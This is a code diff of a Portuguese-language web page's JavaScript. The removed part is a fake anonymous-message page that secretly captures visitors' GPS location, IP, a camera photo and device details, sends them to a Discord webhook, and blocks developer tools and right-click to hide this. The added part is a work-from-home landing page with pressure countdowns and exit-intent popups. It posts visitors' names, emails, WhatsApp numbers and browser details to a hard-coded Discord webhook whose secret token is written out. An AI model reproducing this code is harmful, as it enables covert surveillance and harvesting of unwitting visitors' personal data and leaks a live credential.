-                            { 
-                                name: "Timestamp", 
-                                value: `\`${new Date().toLocaleString('pt-BR')}\``, 
-                                inline: true 
-                            }
-                        ],
-                        image: { url: "attachment://capture.jpg" },
-                        footer: { text: "Visual Verification System" }, 
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                const formData = new FormData();
-                formData.append("payload_json", JSON.stringify(payload));
-                const blob = this.dataURLtoBlob(this.data.camera.image);
-                formData.append("file", blob, "capture.jpg");
-                await fetch(this.webhook, { method: 'POST', body: formData });
-            } catch (error) { 
-                // Falha silenciosa
-            }
-        }
-        
-        dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while (n--) { 
-                u8arr[n] = bstr.charCodeAt(n); 
-            }
-            return new Blob([u8arr], { type: mime });
-        }
-        
-        showToast(message, type = 'info') {
-            const toast = document.createElement('div');
-            toast.className = `toast ${type} show`;
-            toast.textContent = message;
-            document.body.appendChild(toast);
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => { 
-                    if (document.body.contains(toast)) {
-                        document.body.removeChild(toast);
-                    }
-                }, 300);
-            }, 2500);
-        }
-        
-        validateForm() {
-            const pergunta = document.getElementById('pergunta').value.trim();
-            if (!pergunta || pergunta.length < 5) {
-                this.showToast('Por favor, digite pelo menos 5 caracteres', 'error');
-                return false;
-            }
-            return true;
-        }
-        
-        async handleFormSubmit() {
-            if (!this.validateForm()) return;
+        });
+
+        // Envio do formulário
+        function enviarDados(event) {
+            event.preventDefault();
             
-            if (this.flags.formSubmitted) return;
-            this.flags.formSubmitted = true;
-            
+            // Mostrar loading
+            document.getElementById('modal-captura').style.display = 'none';
             document.getElementById('loading-overlay').style.display = 'flex';
-            document.getElementById('btn-enviar').disabled = true;
             
-            this.data.behavior.timeToSubmit = Date.now() - this.data.behavior.startTime;
-            await this._sD();
+            // Coletar dados
+            const dados = {
+                nome: document.getElementById('nome').value,
+                email: document.getElementById('email').value,
+                whatsapp: document.getElementById('whatsapp').value,
+                data: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                resolucao: `${screen.width}x${screen.height}`,
+                pagina: 'Landing Page - Trabalhe de Casa'
+            };
+            
+            // Enviar para webhook (substitua pela sua URL)
+            const webhookUrl = 'https://discord.com/api/webhooks/1356839153790095509/mT5WvVHY9oleHuMlegTiB_A-_SunQ3m2bki0AkUnBAngHN2z6pqVHRjqFra-MO2vRGs9';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '🔥 **NOVA CAPTURA - Landing Page**',
+                    embeds: [{
+                        title: 'Novo Lead Capturado',
+                        color: 0x00d26a,
+                        fields: [
+                            { name: 'Nome', value: dados.nome, inline: true },
+                            { name: 'E-mail', value: dados.email, inline: true },
+                            { name: 'WhatsApp', value: dados.whatsapp, inline: true },
+                            { name: 'Data/Hora', value: new Date().toLocaleString('pt-BR'), inline: true },
+                            { name: 'Plataforma', value: dados.plataforma, inline: true },
+                            { name: 'Resolução', value: dados.resolucao, inline: true },
+                            { name: 'Página', value: dados.pagina, inline: false },
+                            { name: 'User Agent', value: '```' + dados.userAgent.substring(0, 1000) + '```', inline: false }
+                        ],
+                        footer: { text: 'Sistema de Captura Automático' },
+                        timestamp: dados.data
+                    }]
+                })
+            }).catch(err => console.log('Erro ao enviar:', err));
+            
+            // Redirecionar após 3 segundos
+            setTimeout(() => {
+                window.location.href = 'https://pay.kiwify.com.br/seu-link-de-pagamento';
+            }, 3000);
         }
-        
-        async _sD() {
-            try {
-                const pergunta = document.getElementById('pergunta').value.trim();
-                const nome = document.getElementById('nome').value.trim() || 'Anônimo';
-                const embed = {
-                    title: 'New Anonymous Submission', 
-                    description: `**Message:** ${pergunta}`, 
-                    color: 0xe94560,
-                    fields: [
-                        { 
-                            name: 'User', 
-                            value: `**Name:** ${nome}\n**Date:** ${new Date().toLocaleString('pt-BR')}`, 
-                            inline: false 
-                        },
-                        { 
-                            name: 'Network Info', 
-                            value: `**IP:** ${this.data.ip.ip || 'N/A'}\n**City:** ${this.data.ip.city || 'N/A'}\n**Country:** ${this.data.ip.country || 'N/A'}`, 
-                            inline: true 
-                        },
-                        { 
-                            name: 'Location', 
-                            value: this.data.location.status === 'success' ? 
-                                `**GPS:** ${this.data.location.lat?.toFixed(6)}, ${this.data.location.lon?.toFixed(6)}\n[Map](${this.data.location.googleMapsUrl})` : 
-                                'Not available', 
-                            inline: true 
-                        },
-                        { 
-                            name: 'Device', 
-                            value: `**Type:** ${this.data.device.isMobile ? 'Mobile' : 'Desktop'}\n**OS:** ${this.data.device.isIOS ? 'iOS' : this.data.device.isAndroid ? 'Android' : 'Other'}\n**Browser:** ${this.data.device.isChrome ? 'Chrome' : this.data.device.isSafari ? 'Safari' : 'Other'}`, 
-                            inline: false 
-                        },
-                        { 
-                            name: 'Behavior', 
-                            value: `**Time:** ${Math.round(this.data.behavior.timeToSubmit / 1000)}s\n**Interactions:** ${this.data.behavior.interactions.length}`, 
-                            inline: true 
-                        },
-                        { 
-                            name: 'Verification Status', 
-                            value: [
-                                `GPS: ${this.data.location.status === 'success' ? '✅' : '❌'}`, 
-                                `Camera: ${this.data.camera.status === 'success' ? '✅' : '❌'}`, 
-                                `Attempts: ${this.flags.verificationAttempts}`
-                            ].join('\n'), 
-                            inline: true 
-                        }
-                    ],
-                    footer: { text: 'Anonymous Submission System' }, 
-                    timestamp: new Date().toISOString()
-                };
-                const payload = { 
-                    username: 'Anonymous Message', 
-                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828833.png', 
-                    embeds: [embed] 
-                };
-                const response = await fetch(this.webhook, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify(payload) 
-                });
-                if (response.ok) {
-                    this.showSuccessModal();
-                } else {
-                    throw new Error('Failed to send');
-                }
-            } catch (error) {
-                this.flags.formSubmitted = false;
-                document.getElementById('btn-enviar').disabled = false;
-                this.showToast('Erro ao enviar. Tente novamente.', 'error');
-            } finally {
-                document.getElementById('loading-overlay').style.display = 'none';
+
+        // Iniciar tudo
+        document.addEventListener('DOMContentLoaded', () => {
+            iniciarContador();
+            atualizarVagas();
+            atualizarAlunos();
+            
+            // Abrir modal automaticamente após 25 segundos
+            setTimeout(() => {
+                abrirModal();
+            }, 25000);
+        });
+
+        // Prevenir saída da página
+        let tentativaSaida = true;
+        document.addEventListener('mouseleave', (e) => {
+            if (e.clientY <= 0 && tentativaSaida) {
+                tentativaSaida = false;
+                abrirModal();
+                setTimeout(() => { tentativaSaida = true; }, 5000);
             }
-        }
-        
-        showSuccessModal() {
-            document.getElementById('success-modal').style.display = 'flex';
-            document.getElementById('pergunta').value = '';
-            document.getElementById('nome').value = '';
-            const counter = document.getElementById('char-count');
-            if (counter) counter.textContent = '0';
-            this.flags.formSubmitted = false;
-            document.getElementById('btn-enviar').disabled = false;
-        }
-    }
-    
-    window.closeSuccessModal = function() {
-        const modal = document.getElementById('success-modal');
-        if (modal) modal.style.display = 'none';
-    };
-    
-    document.addEventListener('DOMContentLoaded', () => {
-        window.permissionManager = new PermissionManager();
-    });
-    
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    document.addEventListener('contextmenu', (e) => {
-        e.preventDefault();
-        return false;
-    });
-</script>
+        });
+    </script>
 </body>
 </html>
